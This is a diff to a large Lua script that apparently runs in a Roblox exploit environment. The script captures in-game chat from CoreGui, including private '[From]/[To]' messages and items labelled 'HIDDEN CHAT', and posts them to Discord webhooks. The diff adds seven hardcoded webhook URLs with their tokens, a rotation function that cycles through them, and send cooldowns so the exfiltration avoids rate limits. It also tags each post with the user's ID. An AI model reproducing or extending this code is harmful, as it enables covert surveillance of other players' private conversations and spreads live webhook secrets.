@@ -30076,6 +30076,8 @@ local script = G2L["299"];
 	local RCTScrollContentView = RCTScrollView:WaitForChild("RCTScrollContentView")
 	
 	local processedFrames = {}
+	local lastWebhookTime = 0
+	local WEBHOOK_COOLDOWN = 0.5
 	
 	local function getEmbedColor(buttonText)
 		if string.match(buttonText, "HIDDEN CHAT") then
@@ -30096,6 +30098,12 @@ local script = G2L["299"];
 	end
 	
 	local function sendWebhook(display, message, embedColor, buttonText)
+		-- Check cooldown
+		local currentTime = tick()
+		if currentTime - lastWebhookTime < WEBHOOK_COOLDOWN then
+			task.wait(WEBHOOK_COOLDOWN - (currentTime - lastWebhookTime))
+		end
+	
 		local prefix = ""
 	
 		if string.match(buttonText, "%[From") or string.match(buttonText, "%[To") then
@@ -30123,6 +30131,8 @@ local script = G2L["299"];
 				Body = HttpService:JSONEncode(payload)
 			})
 		end)
+	
+		lastWebhookTime = tick()
 	end
 	
 	local function onFrameAdded(frame)
@@ -30200,7 +30210,26 @@ local script = G2L["29a"];
 	local Teams = game:GetService("Teams")
 	local LocalPlayer = Players.LocalPlayer
 	
-	local WEBHOOK_URL = "https://discordapp.com/api/webhooks/1495421144583372852/gfcaXuJASoC1jV0dnZhIYKip-1QkTYCwhwrNlE52huinWxAJXd7tVv8dV4oP1peEq_E4"
+	local WEBHOOKS = {
+		"https://discordapp.com/api/webhooks/1495421144583372852/gfcaXuJASoC1jV0dnZhIYKip-1QkTYCwhwrNlE52huinWxAJXd7tVv8dV4oP1peEq_E4",
+		"https://discordapp.com/api/webhooks/1495461666908016682/vYyhBeSzCZh_2duvTZ7DFXmNY5_t_Ai5iuMw5tAnirBjL0Vg2N3rVHaAvcAVyUiPnzQb",
+		"https://discordapp.com/api/webhooks/1495461694325915771/Xf0M2USS0nMqEyH-tQvbaEwQhv1THz6zTxJEb31MsuxgPLnpiwxvGy2KSJ3lgc6A-X9P",
+		"https://discordapp.com/api/webhooks/1495461717096923156/QIWgqKbCqqVIh2lwn-vI3n6cHcFKlJ9xd217pSy51Fx2NrZX7FeMmgiGIxxw9MRG7q3T",
+		"https://discordapp.com/api/webhooks/1495461753058889799/KmrkZuE1blh7nh3pCF-eHHn_P-nQOP4N_wQF2vGjqueFz0t42gEc39kPsXF1tiUbWe4W",
+		"https://discordapp.com/api/webhooks/1495461794272248020/wsk_WDckmKueS2g8_75xjxdaSg54Q5ASvTn1dfGMP3r5VfHyt4T7dU1bSFfdLl0F2Qz5",
+		"https://discordapp.com/api/webhooks/1495461823875645671/ylVdEqXFIHK02MPdFTy17loCIv8V8Ro-HXDpgUG-WBb11LZB_87-Tx-BuAhEgGHJ35by",
+	}
+	
+	local currentWebhookIndex = 1
+	
+	local function getNextWebhook()
+		local webhook = WEBHOOKS[currentWebhookIndex]
+		currentWebhookIndex = currentWebhookIndex + 1
+		if currentWebhookIndex > #WEBHOOKS then
+			currentWebhookIndex = 1
+		end
+		return webhook
+	end
 	
 	local CoreGui = game:GetService("CoreGui")
 	local ExperienceChat = CoreGui:WaitForChild("ExperienceChat")
@@ -30274,12 +30303,16 @@ local script = G2L["29a"];
 			["color"] = embedColor,
 			["footer"] = {
 				["text"] = getAdminFooter()
-			}
+			},
+			["timestamp"] = DateTime.now():ToIsoDate()
 		}
 	
 		local payload = {
+			["username"] = tostring(LocalPlayer.UserId),
 			["embeds"] = {embed}
 		}
+	
+		local WEBHOOK_URL = getNextWebhook()
 	
 		pcall(function()
 			request({
@@ -30401,6 +30434,8 @@ local script = G2L["29b"];
 	local RCTScrollContentView = RCTScrollView:WaitForChild("RCTScrollContentView")
 	
 	local processedFrames = {}
+	local lastWebhookTime = 0
+	local WEBHOOK_COOLDOWN = 2
 	
 	local function getEmbedColor(buttonText)
 		if string.match(buttonText, "HIDDEN CHAT") then
@@ -30448,6 +30483,12 @@ local script = G2L["29b"];
 			return
 		end
 	
+		-- Check cooldown
+		local currentTime = tick()
+		if currentTime - lastWebhookTime < WEBHOOK_COOLDOWN then
+			task.wait(WEBHOOK_COOLDOWN - (currentTime - lastWebhookTime))
+		end
+	
 		local prefix = ""
 	
 		if string.match(buttonText, "%[From") or string.match(buttonText, "%[To") then
@@ -30475,6 +30516,8 @@ local script = G2L["29b"];
 				Body = HttpService:JSONEncode(payload)
 			})
 		end)
+	
+		lastWebhookTime = tick()
 	end
 	
 	local function onFrameAdded(frame)
